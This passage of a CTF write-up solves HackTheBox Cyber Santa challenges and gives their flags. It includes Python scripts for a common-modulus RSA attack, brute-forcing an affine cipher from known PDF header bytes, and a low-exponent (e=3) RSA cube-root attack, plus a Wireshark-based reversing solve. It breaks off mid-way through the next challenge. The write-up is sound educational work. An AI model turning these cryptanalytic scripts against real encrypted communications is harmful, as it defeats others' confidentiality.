2
</pre><td class="rouge-code"><pre>{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'} 
</pre></table></code></div></div><p>We see that there 2 ciphertexts, each having their own <code class="language-plaintext highlighter-rouge">e</code> value. However, we observe that the <code class="language-plaintext highlighter-rouge">n</code> value is the same for both, so we are possbily seeing a <code class="language-plaintext highlighter-rouge">Common Modulus</code> problem.</p><p>To get the message, I used the following Python script (Referenced from <a href="https://wellingtonlee.gitlab.io/2017/11/14/2017-11-14-Common-Modulus-Writeup/">here</a>):</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>

<span class="n">n</span> <span class="o">=</span> <span class="mh">0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef</span>

<span class="n">e1</span> <span class="o">=</span> <span class="mh">0x10001</span>
<span class="n">e2</span> <span class="o">=</span> <span class="mh">0x23</span>
<span class="n">c1</span> <span class="o">=</span> <span class="mh">0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874</span>
<span class="n">c2</span> <span class="o">=</span> <span class="mh">0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208</span>

<span class="n">not_used</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="n">gcdext</span><span class="p">(</span><span class="n">e1</span><span class="p">,</span> <span class="n">e2</span><span class="p">)</span>
<span class="k">assert</span> <span class="n">a</span><span class="o">*</span><span class="n">e1</span> <span class="o">+</span> <span class="n">b</span><span class="o">*</span><span class="n">e2</span> <span class="o">==</span> <span class="mi">1</span>

<span class="c1"># We need this step since b comes out to be negative
</span><span class="n">i</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="n">invert</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>

<span class="c1"># Use modular exponentiation for faster computation
</span><span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">-</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">n</span><span class="p">))</span><span class="o">%</span><span class="n">n</span>

<span class="c1"># Print the flag from hex format
</span><span class="k">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]))</span> 
</pre></table></code></div></div><p>The output of the script gives us the flag.</p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}</code></p><h2 id="xmas-spirit-day-2">XMAS Spirit (Day 2)</h2><blockquote><p>Now that elves have taken over Santa has lost so many letters from kids all over the world. However, there is one kid who managed to locate Santa and sent him a letter. It seems like the XMAS spirit is so strong within this kid. He was so smart that thought of encrypting the letter in case elves captured it. Unfortunately, Santa has no idea about cryptography. Can you help him read the letter?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">crypto_xmas_spirit.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">crypto_xmas_spirit.zip</code> was 2 files: <code class="language-plaintext highlighter-rouge">challenge.py</code> and <code class="language-plaintext highlighter-rouge">encrypted.bin</code>. <code class="language-plaintext highlighter-rouge">encrypted.bin</code> were full of jibberish encrypted content and below the is contents of <code class="language-plaintext highlighter-rouge">challenge.py</code>:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">dt</span><span class="p">):</span>
   <span class="n">mod</span> <span class="o">=</span> <span class="mi">256</span>
   <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="n">a</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">mod</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span> <span class="k">break</span>
   <span class="n">b</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">mod</span><span class="p">)</span>

   <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
   <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">dt</span><span class="p">:</span>
     <span class="n">enc</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">byte</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
     <span class="n">res</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">enc</span><span class="p">])</span>
   <span class="k">return</span> <span class="n">res</span>

<span class="n">dt</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'letter.pdf'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">dt</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'encrypted.bin'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>We see that the <code class="language-plaintext highlighter-rouge">encrypt()</code> function is being used to encrypt the plaintext file. Inside of <code class="language-plaintext highlighter-rouge">encrypt()</code> we see 2 variables <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code> being generated randomly using <code class="language-plaintext highlighter-rouge">random.randint()</code>. These 2 variables were then used to perform the affine cipher on each byte of the plaintext file.</p><p>To decrypt <code class="language-plaintext highlighter-rouge">encrypted.bin</code>, we first need to figure out what were the <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code> values generated at the point of time the <code class="language-plaintext highlighter-rouge">challenge.py</code> was first executed.</p><p>Since we know that the plaintext file was a PDF file, then its magic bytes, basically the first 5 bytes must have been <code class="language-plaintext highlighter-rouge">25 50 44 46 2d</code>, which we got from <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">here</a>. Therefore, we just need to bruteforce all possible combinations of <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code> that will cause the first 5 bytes <code class="language-plaintext highlighter-rouge">25 50 44 46 2d</code> to become the first 5 bytes of <code class="language-plaintext highlighter-rouge">encrypted.bin</code>.</p><p>Here is the script I used to brute-force <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code>:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="n">enc_header</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"encrypted.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">clr_header</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x25\x50\x44\x46\x2d</span><span class="s">"</span>

<span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>

<span class="n">mod</span> <span class="o">=</span> <span class="mi">256</span>

<span class="n">possible_a_values</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">257</span><span class="p">)</span> <span class="k">if</span> <span class="n">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">]</span>
<span class="n">possible_b_values</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">257</span><span class="p">))</span>

<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">possible_a_values</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">possible_b_values</span><span class="p">:</span>

        <span class="c1"># From challenge.py
</span>        <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
        <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">clr_header</span><span class="p">:</span>
            <span class="n">enc</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">byte</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">enc</span><span class="p">])</span>

        <span class="k">if</span><span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="n">enc_header</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"a: </span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s"> b: </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">break</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>a: 169 b: 160
</pre></table></code></div></div><p>Now that we have the <code class="language-plaintext highlighter-rouge">a</code> and <code class="language-plaintext highlighter-rouge">b</code> values, we can just perform the affine cipher on all possible byte values (<code class="language-plaintext highlighter-rouge">0x00</code> to <code class="language-plaintext highlighter-rouge">0xFF</code>) to obtain a mapping between ciphertext byte to plaintext byte and then use that to decrypt <code class="language-plaintext highlighter-rouge">encrypted.bin</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="n">a</span> <span class="o">=</span> <span class="mi">169</span>
<span class="n">b</span> <span class="o">=</span> <span class="mi">160</span> 

<span class="n">mod</span> <span class="o">=</span> <span class="mi">256</span>
<span class="n">mapping</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
   <span class="n">mapping</span><span class="p">[(</span><span class="n">a</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">mod</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>

<span class="n">contents</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"encrypted.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">contents</span><span class="p">)):</span>
   <span class="n">val</span> <span class="o">=</span> <span class="n">mapping</span><span class="p">[</span><span class="n">contents</span><span class="p">[</span><span class="n">idx</span><span class="p">]]</span>
   <span class="n">res</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">val</span><span class="p">])</span>

<span class="nb">open</span><span class="p">(</span><span class="s">"letter.pdf"</span><span class="p">,</span><span class="s">"wb"</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file letter.pdf 
letter.pdf: PDF document, version 1.5
</pre></table></code></div></div><p>If we open the PDF file, we get the flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta13.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{4ff1n3_c1ph3r_15_51mpl3_m47h5}</code></p><h2 id="missing-reindeer-day-3">Missing Reindeer (Day 3)</h2><blockquote><p>Not only elves took control of Santa’s Christmas factory but they kidnapped Rudolf as well. Our cyber spies managed to capture an email related to Santa’s favorite reindeer. Can you help them decrypt the message?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">crypto_missing_reindeer.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">crypto_missing_reindeer.zip</code> was a file <code class="language-plaintext highlighter-rouge">message.eml</code>. Inside was an email with 2 attachments:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre>From psparkles@northpole.xms Tue Nov 30 19:07:09 2021
Date: Tue, 30 Nov 2021 14:09:11 -0500
From: Pep Sparkles &lt;sparkles@northpole.xms&gt;
To: Tiny Jingles &lt;tjingles@northpole.xms&gt;
Subject: Rudolf's Location
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_5028_7368284.1115579351471"

------=_Part_5028_7368284.1115579351471
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Content-Disposition: inline
From: Pep Sparkles &lt;psparkles@northpole.xms&gt;
Date: Nov 30, 2021 1:17 PM
Subject: Rudolf's Location
To: tjingles@northpole.xms


Hello Mr Jingles,

We got the reindeer as you requested. There is a problem though. Its nose is so red and bright and makes it very hard to hide him anywhere near north pole. We have moved to a secret location far away. I have encrypted this information with your public key in case you know who is watching.


------=_Part_5028_7368284.1115579351471
Content-Type: application/text/plain; name*=secret.enc
Content-Transfer-Encoding: base64
Content-Disposition: attachment
Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l
------=_Part_5028_7368284.1115579351471
Content-Type: application/octet-stream; name*=pubkey.der
Content-Transfer-Encoding: base64
Content-Disposition: attachment
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEA5iOXKISx9NcivdXuW+uE
y4R2DC7Q/6/ZPNYDD7INeTCQO9FzHcdMlUojB1MD39cbiFzWbphb91ntF6mF9+fY
N8hXvTGhR9dNomFJKFj6X8+4kjCHjvT//P+S/CkpiTJkVK+1G7erJT/v1bNXv4Om
OfFTIEr8Vijz4CAixpSdwjyxnS/WObbVmHrDMqAd0jtDemd3u5Z/gOUi6UHl+XIW
Cu1Vbbc5ORmAZCKuGn3JsZmW/beykUFHLWgD3/QqcT21esB4/KSNGmhhQj3joS7Z
z6+4MeXWm5LXGWPQIyKMJhLqM0plLEYSH1BdG1pVEiTGn8gjnP4Qk95oCV9xUxWW
ZwIBAw==
-----END PUBLIC KEY-----
------=_Part_5028_7368284.1115579351471--
</pre></table></code></div></div><p>I extracted the two attachments: <code class="language-plaintext highlighter-rouge">secret.enc</code> and <code class="language-plaintext highlighter-rouge">pubkey.der</code>. For <code class="language-plaintext highlighter-rouge">secret.enc</code>, base64-decoding was needed to be done whereas <code class="language-plaintext highlighter-rouge">pubkey.der</code> could simply be extracted by copying and pasting.</p><p>According to the email, <code class="language-plaintext highlighter-rouge">secret.enc</code> was an encrypted message that was produced when the original file was encrypted with the given public key <code class="language-plaintext highlighter-rouge">pubkey.der</code>.</p><p>Lets take a look at <code class="language-plaintext highlighter-rouge">pubkey.der</code>. Using this <a href="https://report-uri.com/home/pem_decoder">website</a>, I was able to retrieve the modules and the public exponent.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta51.png" alt="" /></p><p>Looking at the small public exponent <code class="language-plaintext highlighter-rouge">e</code>, which had a value of <code class="language-plaintext highlighter-rouge">3</code>, it seems that it is vulnerable to the <code class="language-plaintext highlighter-rouge">Low Public Exponent Attack</code>. I then found a writeup <a href="https://github.com/d4rkvaibhav/picoCTF-2018-Writeups/blob/master/Cryptography/SAFERSA/README.md">here</a> and referenced the script to produced the following to solve for the flag.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span> 
<span class="k">try</span><span class="p">:</span>
        <span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="k">except</span> <span class="nb">ImportError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Install gmpy2 first to run this program"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1"># From https://report-uri.com/home/pem_decoder
</span><span class="n">n</span><span class="o">=</span><span class="mh">0xe623972884b1f4d722bdd5ee5beb84cb84760c2ed0ffafd93cd6030fb20d7930903bd1731dc74c954a23075303dfd71b885cd66e985bf759ed17a985f7e7d837c857bd31a147d74da261492858fa5fcfb89230878ef4fffcff92fc292989326454afb51bb7ab253fefd5b357bf83a639f153204afc5628f3e02022c6949dc23cb19d2fd639b6d5987ac332a01dd23b437a6777bb967f80e522e941e5f972160aed556db7393919806422ae1a7dc9b19996fdb7b29141472d6803dff42a713db57ac078fca48d1a6861423de3a12ed9cfafb831e5d69b92d71963d023228c2612ea334a652c46121f505d1b5a551224c69fc8239cfe1093de68095f7153159667</span>
<span class="n">n</span><span class="o">=</span><span class="nb">hex</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<span class="n">e</span><span class="o">=</span><span class="mi">3</span>

<span class="n">cipher</span><span class="o">=</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"secret.enc"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>
 
 
<span class="k">with</span> <span class="n">gmpy2</span><span class="p">.</span><span class="n">local_context</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="n">context</span><span class="p">(),</span> <span class="n">precision</span><span class="o">=</span><span class="mi">800</span><span class="p">)</span> <span class="k">as</span> <span class="n">ctx</span><span class="p">:</span>
    <span class="n">ctx</span><span class="p">.</span><span class="n">precision</span> <span class="o">+=</span> <span class="mi">800</span>
    <span class="n">root</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="n">cbrt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="s">'%x'</span> <span class="o">%</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">root</span><span class="p">)).</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">AttributeError</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="s">'%x'</span> <span class="o">%</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">root</span><span class="p">))).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span> 
</pre></table></code></div></div><p>Here is the result:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 reindeer.py
We are <span class="k">in </span>Antarctica, near the independence mountains.
HTB<span class="o">{</span>w34k_3xp0n3n7_ffc896<span class="o">}</span>
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{w34k_3xp0n3n7_ffc896}</code></p><h1 id="reversing">Reversing</h1><h2 id="infiltration-day-1">Infiltration (Day 1)</h2><blockquote><p>We got a hold of an internal communication tool being used by the elves, and managed to hook it up to their server. However, it won’t let us see their secrets? Can you take a look inside?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">rev_infiltration.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">rev_infiltration.zip</code> was a binary <code class="language-plaintext highlighter-rouge">client</code>. Executing it without any arguments shows us the command format:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./client                     
./client <span class="o">[</span>server] <span class="o">[</span>port]
</pre></table></code></div></div><p>If we execute it with the IP address and port number of the server, we get the following output in the shell:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./client 46.101.79.205 32206
<span class="o">[!]</span> Untrusted Client Location - Enabling Opaque Mode                
</pre></table></code></div></div><p>While decompiling using <code class="language-plaintext highlighter-rouge">Ghidra</code> could help, I decided to use Wireshark to take a look at what was being sent between the program and the server.</p><p>After filtering down to the relevant packets (either by filtering by IP address using <code class="language-plaintext highlighter-rouge">ip.addr == 46.101.79.205</code> or by port number using <code class="language-plaintext highlighter-rouge">tcp.port == 32206</code>), I followed the TCP stream of these packets.</p><p>Immediately, the flag can be spotted in the stream.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta14.png" alt="" /></p><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{n0t_qu1t3_s0_0p4qu3}</code></p><h2 id="gift-wrapping-day-2">Gift Wrapping (Day 2)</h2><blockquote><p>The elves won’t let you into their secret hideout without the password. Luckily, they’ve given it to you as a gift! But it seems to be wrapped up tight…<br /> Downloadable Content: <code class="language-plaintext highlighter-rouge">rev_gift_wrapping.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">rev_gift_wrapping.zip</code> was a binary <code class="language-plaintext highlighter-rouge">giftwrap</code>. We first attempt to execute it to see what it does.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./giftwrap 
What<span class="s1">'s the magic word? flag 
Wrong password! Who are you?!?
